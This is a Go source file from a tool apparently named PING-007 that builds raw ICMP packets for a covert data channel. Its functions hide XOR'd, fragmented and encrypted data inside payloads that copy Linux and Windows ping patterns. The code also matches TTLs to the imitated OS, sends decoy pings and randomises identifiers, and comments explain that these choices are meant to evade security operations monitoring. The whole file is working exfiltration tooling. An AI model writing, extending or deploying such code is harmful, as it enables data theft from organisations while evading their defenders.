// Package network handles raw ICMP socket operations for PING-007. It covers
// packet construction, transmission, reception, TTL spoofing, OS signature
// mimicry (Linux struct timeval / Windows alphabet patterns), and steganographic
// fragmentation across multiple 64-byte echo requests.
//
// Opening a raw ICMP socket requires root / CAP_NET_RAW on Linux or Administrator
// on Windows. The NetworkService.Close method must be called to release the socket.
package network

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"time"

	"ping007/pkg/types"
)

const (
	ProtocolICMP = 1
	ICMPEcho     = 8
	ICMPReply    = 0

	// Ping payload size constants
	LinuxPingPayloadSize    = 56
	WindowsPingPayloadSize  = 32
	LinuxPingPatternOffset  = 8
	WindowsPingPatternOffset = 8
)

// NetworkService handles raw ICMP packet operations
type NetworkService struct {
	conn         *net.IPConn
	config       NetworkConfig
	metrics      *types.NetworkMetrics
	sessionID    string
	sequenceID   uint16
	processID    uint16  // random 16-bit ICMP identifier — set once per session (real ping uses PID, but a long-running fixed ID is a SOC fingerprint)
	mu           sync.RWMutex
}

type NetworkConfig struct {
	DefaultInterface string
	Timeout          time.Duration
	MaxPacketSize    int
}

func NewNetworkService(config NetworkConfig, sessionID string) (*NetworkService, error) {
	addr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
	if err != nil {
		return nil, fmt.Errorf("failed to resolve IP address: %w", err)
	}

	conn, err := net.ListenIP("ip4:icmp", addr)
	if err != nil {
		return nil, fmt.Errorf("failed to create ICMP connection (need root): %w", err)
	}

	service := &NetworkService{
		conn:       conn,
		config:     config,
		sessionID:  sessionID,
		sequenceID: 0,             // seq starts at 0; first buildICMPPacket increment → 1 (iputils behaviour)
		processID:  icmpIDFromOS(), // Linux = getpid()&0xFFFF, Windows = 0x0001
		metrics:    &types.NetworkMetrics{},
	}

	return service, nil
}

// SetProcessID overrides the ICMP identifier for the session.
// Default is OS-native (Linux PID, Windows 0x0001). Pass a 0-65535 value for
// a fixed ID, or call with the result of a random uint16 for random mode.
func (n *NetworkService) SetProcessID(id uint16) {
	n.mu.Lock()
	n.processID = id
	n.mu.Unlock()
}

// SendPacket sends a network packet to the target
func (n *NetworkService) SendPacket(packet *types.NetworkPacket, target string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	// Parse target IP
	targetIP := net.ParseIP(target)
	if targetIP == nil {
		return fmt.Errorf("invalid target IP: %s", target)
	}

	// Build ICMP packet
	icmpPacket, err := n.buildICMPPacket(packet)
	if err != nil {
		return fmt.Errorf("failed to build ICMP packet: %w", err)
	}

	// Set write deadline
	if err := n.conn.SetWriteDeadline(time.Now().Add(n.config.Timeout)); err != nil {
		return fmt.Errorf("failed to set write deadline: %w", err)
	}

	// Send packet
	addr := &net.IPAddr{IP: targetIP}
	_, err = n.conn.WriteToIP(icmpPacket, addr)
	if err != nil {
		n.metrics.Errors++
		return fmt.Errorf("failed to send packet: %w", err)
	}

	// Update metrics
	n.metrics.PacketsSent++
	n.metrics.BytesTransmitted += int64(len(icmpPacket))
	n.metrics.LastUpdated = time.Now()

	return nil
}

// ReceivePacket receives and parses incoming packets
func (n *NetworkService) ReceivePacket(timeout time.Duration) (*types.NetworkPacket, error) {
	// Set read deadline
	if err := n.conn.SetReadDeadline(time.Now().Add(timeout)); err != nil {
		return nil, fmt.Errorf("failed to set read deadline: %w", err)
	}

	// Read packet
	buffer := make([]byte, n.config.MaxPacketSize)
	bytesRead, addr, err := n.conn.ReadFromIP(buffer)
	if err != nil {
		n.metrics.Errors++
		return nil, fmt.Errorf("failed to receive packet: %w", err)
	}

	// Parse ICMP packet
	packet, err := n.parseICMPPacket(buffer[:bytesRead], addr.IP.String())
	if err != nil {
		return nil, fmt.Errorf("failed to parse ICMP packet: %w", err)
	}

	// Update metrics
	n.metrics.PacketsReceived++
	n.metrics.BytesReceived += int64(bytesRead)
	n.metrics.LastUpdated = time.Now()

	return packet, nil
}

// buildICMPPacket constructs a raw ICMP packet
func (n *NetworkService) buildICMPPacket(packet *types.NetworkPacket) ([]byte, error) {
	// Increment sequence ID
	n.sequenceID++

	// ICMP header: type(1) + code(1) + checksum(2) + identifier(2) + sequence(2) = 8 bytes
	header := make([]byte, 8)

	// Set ICMP type and code
	header[0] = ICMPEcho // ICMP Echo Request
	header[1] = 0        // Code

	// Set identifier (process ID like Linux ping)
	binary.BigEndian.PutUint16(header[4:6], n.processID)

	// Set sequence number
	binary.BigEndian.PutUint16(header[6:8], n.sequenceID)

	// Combine header and payload
	icmpPacket := append(header, packet.Payload...)

	// Calculate and set checksum
	checksum := n.calculateChecksum(icmpPacket)
	binary.BigEndian.PutUint16(header[2:4], checksum)

	// Rebuild packet with correct checksum
	icmpPacket = append(header, packet.Payload...)

	// Update packet metadata
	packet.Metadata.Timestamp = time.Now()
	packet.Metadata.Size = len(icmpPacket)
	packet.Metadata.SequenceID = n.sequenceID
	packet.Metadata.SessionID = n.sessionID

	return icmpPacket, nil
}

// parseICMPPacket parses a raw ICMP packet
func (n *NetworkService) parseICMPPacket(data []byte, sourceIP string) (*types.NetworkPacket, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("packet too short for ICMP header")
	}

	// Parse ICMP header
	icmpType := data[0]
	icmpCode := data[1]
	checksum := binary.BigEndian.Uint16(data[2:4])
	identifier := binary.BigEndian.Uint16(data[4:6])
	sequence := binary.BigEndian.Uint16(data[6:8])

	// Extract payload
	payload := data[8:]

	// Create packet
	packet := &types.NetworkPacket{
		Payload:  payload,
		Checksum: checksum,
		Headers: map[string]any{
			"icmp_type":   icmpType,
			"icmp_code":   icmpCode,
			"identifier":  identifier,
			"sequence":    sequence,
		},
		Metadata: types.PacketMetadata{
			Timestamp:  time.Now(),
			SourceIP:   sourceIP,
			Protocol:   "icmp",
			Size:       len(data),
			SequenceID: sequence,
			SessionID:  n.sessionID,
		},
	}

	return packet, nil
}

// calculateChecksum computes the ICMP checksum
func (n *NetworkService) calculateChecksum(data []byte) uint16 {
	// Clear existing checksum
	data[2] = 0
	data[3] = 0

	var sum uint32

	// Sum all 16-bit words
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}

	// Add left-over byte, if any
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}

	// Add carry
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	// One's complement
	return uint16(^sum)
}

// GetMetrics returns current network metrics
func (n *NetworkService) GetMetrics() *types.NetworkMetrics {
	n.mu.RLock()
	defer n.mu.RUnlock()

	// Create copy to avoid race conditions
	metricsCopy := *n.metrics
	return &metricsCopy
}

// UpdateLatency updates the latency metric
func (n *NetworkService) UpdateLatency(latency time.Duration) {
	n.mu.Lock()
	defer n.mu.Unlock()
	n.metrics.LatencyMs = float64(latency.Nanoseconds()) / 1e6
}

// UpdateThroughput updates the throughput metric
func (n *NetworkService) UpdateThroughput(bytesPerSecond float64) {
	n.mu.Lock()
	defer n.mu.Unlock()
	n.metrics.ThroughputBps = bytesPerSecond
}

// SetTTL is defined in network_unix.go (Linux/macOS) and network_windows.go.

// SetTTLForSignature applies the TTL that matches the chosen OS signature.
// Linux/macOS = 64, Windows = 128.  "none" = leave kernel default.
func (n *NetworkService) SetTTLForSignature(signature string) error {
	switch signature {
	case "windows":
		return n.SetTTL(128)
	case "linux", "":
		return n.SetTTL(64)
	default: // "none" — raw mode, don't touch TTL
		return nil
	}
}

// SendDecoyPing sends a clean, data-free ICMP echo that looks like a real ping.
// Use it to blend a few legitimate-looking pings around your actual data packets.
func (n *NetworkService) SendDecoyPing(target, signature string) error {
	pb := &PacketBuilder{sessionID: n.sessionID}
	var payload []byte
	switch signature {
	case "windows":
		payload = pb.createWindowsPingPayload(nil)
	case "none":
		payload = make([]byte, 0)
	default:
		payload = pb.createLinuxPingPayload(nil)
	}
	packet := &types.NetworkPacket{
		Payload: payload,
		Headers: make(map[string]any),
		Metadata: types.PacketMetadata{
			Protocol:  "icmp",
			SessionID: n.sessionID,
		},
	}
	return n.SendPacket(packet, target)
}

// Close closes the network connection
func (n *NetworkService) Close() error {
	if n.conn != nil {
		return n.conn.Close()
	}
	return nil
}

// PacketBuilder helps construct specialized packets
type PacketBuilder struct {
	sessionID string
}

func NewPacketBuilder(sessionID string) *PacketBuilder {
	return &PacketBuilder{
		sessionID: sessionID,
	}
}

// CreateDataPacket creates a packet for data transmission
func (pb *PacketBuilder) CreateDataPacket(data []byte, priority string) *types.NetworkPacket {
	return &types.NetworkPacket{
		Payload:  data,
		Headers:  make(map[string]any),
		Checksum: 0, // Will be calculated during send
		Metadata: types.PacketMetadata{
			Protocol:   "icmp",
			SessionID:  pb.sessionID,
			Priority:   priority,
			MaxRetries: 3,
		},
	}
}

// CreateStealthPacket creates a packet with stealth characteristics that mimics legitimate ping
func (pb *PacketBuilder) CreateStealthPacket(data []byte, obfuscated bool) *types.NetworkPacket {
	const standardPingPayloadSize = 56 // 64 total - 8 ICMP header = 56 bytes payload

	// Create stealth payload that looks like legitimate ping
	stealthPayload := pb.createLegitimatePayload(data, standardPingPayloadSize)

	packet := pb.CreateDataPacket(stealthPayload, "stealth")

	// Mark as stealth for internal tracking
	packet.Headers["stealth_mode"] = true
	packet.Headers["mimics_ping"] = true

	if obfuscated {
		packet.Headers["obfuscated"] = true
	}

	return packet
}

// createLegitimatePayload creates a payload identical to specified OS ping (deprecated - use signature-specific methods)
func (pb *PacketBuilder) createLegitimatePayload(data []byte, targetSize int) []byte {
	// Default to Linux ping for backward compatibility
	return pb.createLinuxPingPayload(data)
}

// CreateStealthChunks splits large data into multiple stealth packets
func (pb *PacketBuilder) CreateStealthChunks(data []byte) []*types.NetworkPacket {
	const maxDataPerPacket = 38 // 56 - 16 timeval - 2 length = 38 bytes per packet

	var chunks []*types.NetworkPacket
	totalChunks := (len(data) + maxDataPerPacket - 1) / maxDataPerPacket

	for i := 0; i < len(data); i += maxDataPerPacket {
		end := i + maxDataPerPacket
		if end > len(data) {
			end = len(data)
		}

		chunkData := data[i:end]
		packet := pb.CreateStealthPacket(chunkData, true)

		// Add chunk metadata for reassembly
		packet.Headers["chunk_index"] = i / maxDataPerPacket
		packet.Headers["total_chunks"] = totalChunks
		packet.Headers["chunk_size"] = len(chunkData)

		chunks = append(chunks, packet)
	}

	return chunks
}

// CreateStealthPacketWithSignature creates a packet with specified OS signature
func (pb *PacketBuilder) CreateStealthPacketWithSignature(data []byte, obfuscated bool, signature string) *types.NetworkPacket {
	// Create signature-specific payload
	var stealthPayload []byte
	switch signature {
	case "windows":
		stealthPayload = pb.createWindowsPingPayload(data)
	case "none":
		// Raw ICMP payload without OS signature imitation
		stealthPayload = data
	case "linux":
		fallthrough
	default:
		stealthPayload = pb.createLinuxPingPayload(data)
	}

	packet := pb.CreateDataPacket(stealthPayload, "stealth")

	// Mark as stealth for internal tracking
	packet.Headers["stealth_mode"] = true
	packet.Headers["signature"] = signature

	if obfuscated {
		packet.Headers["obfuscated"] = true
	}

	return packet
}

// CreateStealthChunksWithSignature splits large data into signature-specific chunks
func (pb *PacketBuilder) CreateStealthChunksWithSignature(data []byte, signature string) []*types.NetworkPacket {
	var maxDataPerPacket int
	switch signature {
	case "windows":
		maxDataPerPacket = 24 // 32 - 8 alphabet prefix = 24 bytes max
	case "none":
		maxDataPerPacket = 1400 // Raw ICMP allows much larger payloads
	case "linux":
		fallthrough
	default:
		maxDataPerPacket = 38 // 56 - 16 timeval - 2 length = 38 bytes max
	}

	var chunks []*types.NetworkPacket
	totalChunks := (len(data) + maxDataPerPacket - 1) / maxDataPerPacket

	for i := 0; i < len(data); i += maxDataPerPacket {
		end := i + maxDataPerPacket
		if end > len(data) {
			end = len(data)
		}

		chunkData := data[i:end]
		packet := pb.CreateStealthPacketWithSignature(chunkData, true, signature)

		// Add chunk metadata for reassembly
		packet.Headers["chunk_index"] = i / maxDataPerPacket
		packet.Headers["total_chunks"] = totalChunks
		packet.Headers["chunk_size"] = len(chunkData)

		chunks = append(chunks, packet)
	}

	return chunks
}

// FragMagic is the first byte of a stealth fragment's embedded data.
// It identifies a reassemblable fragment vs. a single-packet payload.
// Value 0xA7 never collides with AES/ChaCha/XOR crypto headers (0x01/0x02/0x03).
const FragMagic = byte(0xA7)

// FragDataCapacity returns the number of actual data bytes per fragment for a given signature.
func FragDataCapacity(signature string) int {
	switch signature {
	case "windows":
		return 18 // 22 stealth capacity − 4 byte frag header
	case "linux", "":
		fallthrough
	default:
		return 34 // 38 stealth capacity (40B region − 2B length) − 4 byte frag header
	}
}

// CreateFragmentedPackets splits encData into multiple stealth ICMP packets that
// each look like a legitimate OS ping.  Each packet carries a 4-byte fragment
// header (magic+session+frag_id+total_frags) followed by up to FragDataCapacity
// bytes of actual data.  The receiver must reassemble all fragments before
// passing the result to the crypto engine.
//
// Returns an error when the data requires more than 255 fragments.
func (pb *PacketBuilder) CreateFragmentedPackets(encData []byte, sessionByte byte, signature string) ([]*types.NetworkPacket, error) {
	cap := FragDataCapacity(signature)
	totalFrags := (len(encData) + cap - 1) / cap
	if totalFrags > 255 {
		return nil, fmt.Errorf("data too large for stealth fragmentation: %d bytes → %d fragments (max 255)", len(encData), totalFrags)
	}

	packets := make([]*types.NetworkPacket, 0, totalFrags)
	for i := 0; i < len(encData); i += cap {
		end := i + cap
		if end > len(encData) {
			end = len(encData)
		}
		fragID := byte(i / cap)

		// Build embedded data: [magic][session][frag_id][total_frags][payload...]
		embedded := make([]byte, 4+end-i)
		embedded[0] = FragMagic
		embedded[1] = sessionByte
		embedded[2] = fragID
		embedded[3] = byte(totalFrags)
		copy(embedded[4:], encData[i:end])

		packet := pb.CreateStealthPacketWithSignature(embedded, false, signature)
		packet.Headers["frag_id"] = fragID
		packet.Headers["total_frags"] = byte(totalFrags)
		packet.Headers["session_byte"] = sessionByte
		packets = append(packets, packet)
	}

	return packets, nil
}

// CreateChunkPacket creates a packet for chunked data transmission
func (pb *PacketBuilder) CreateChunkPacket(chunk *types.DataChunk) *types.NetworkPacket {
	packet := pb.CreateDataPacket(chunk.Data, "normal")

	// Add chunk metadata to headers
	packet.Headers["chunk_id"] = chunk.ID
	packet.Headers["total_chunks"] = chunk.TotalChunks
	packet.Headers["checksum"] = chunk.Checksum

	return packet
}

// NetworkUtils provides utility functions for network operations
type NetworkUtils struct{}

// ValidateIP checks if an IP address is valid and reachable
func (nu *NetworkUtils) ValidateIP(ip string) error {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return fmt.Errorf("invalid IP address format")
	}

	// Basic reachability test with timeout
	conn, err := net.DialTimeout("ip4:icmp", ip, 2*time.Second)
	if err != nil {
		return fmt.Errorf("IP not reachable: %w", err)
	}
	conn.Close()

	return nil
}

// GetLocalInterface returns information about the default network interface
func (nu *NetworkUtils) GetLocalInterface() (*net.Interface, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			return &iface, nil
		}
	}

	return nil, fmt.Errorf("no suitable network interface found")
}

// createLinuxPingPayload creates a 56-byte payload matching iputils ping on 64-bit Linux:
//   [0..15]  struct timeval  (tv_sec uint64 LE + tv_usec uint64 LE)
//   [16..55] sequential: 0x10, 0x11, …, 0x37
//
// iputils pre-fills the buffer with i=0..55 then memcpy's the 16-byte timeval over the
// first 16 bytes, leaving the visible static region at 0x10..0x37.
// Data is XOR'd into bytes [16..55] so the timeval stays naturally varying.
func (pb *PacketBuilder) createLinuxPingPayload(data []byte) []byte {
	result := make([]byte, 56)

	// Pre-fill with sequential bytes 0x00..0x37 (iputils pattern before timeval overwrite)
	for i := 0; i < 56; i++ {
		result[i] = byte(i)
	}

	// 64-bit Linux ABI: struct timeval = uint64 tv_sec + uint64 tv_usec (LE)
	now := time.Now()
	binary.LittleEndian.PutUint64(result[0:8], uint64(now.Unix()))
	binary.LittleEndian.PutUint64(result[8:16], uint64(now.Nanosecond()/1000))

	// Data embedding region: bytes [16..55] (40 bytes total).
	// 2-byte big-endian length prefix + up to 38 bytes of data, each XOR'd with the
	// sequential pattern so the region still looks like 0x10..0x37 to a naive scanner.
	if len(data) > 0 {
		if len(data) > 38 {
			data = data[:38]
		}
		result[16] ^= byte(len(data) >> 8)
		result[17] ^= byte(len(data))
		for i, b := range data {
			result[18+i] ^= b
		}
	}

	return result
}

// createWindowsPingPayload creates a 32-byte payload matching Windows ping.exe:
//   "abcdefghijklmnopqrstuvwabcdefghi"
// Windows has no timeval prefix — the alphabet starts at byte 0.
// Data is XOR'd into bytes [8..31]; bytes [0..7] stay as clean "abcdefgh"
// so the start of the payload always matches the Windows fingerprint.
func (pb *PacketBuilder) createWindowsPingPayload(data []byte) []byte {
	result := make([]byte, 32)
	copy(result, []byte("abcdefghijklmnopqrstuvwabcdefghi"))

	// Same length-prefix scheme as Linux: 2 bytes + data, embedded at offset 8.
	// Max payload: 22 bytes (24 region − 2 length bytes).
	if len(data) > 0 {
		if len(data) > 22 {
			data = data[:22]
		}
		result[8] ^= byte(len(data) >> 8)
		result[9] ^= byte(len(data))
		for i, b := range data {
			result[10+i] ^= b
		}
	}

	return result
}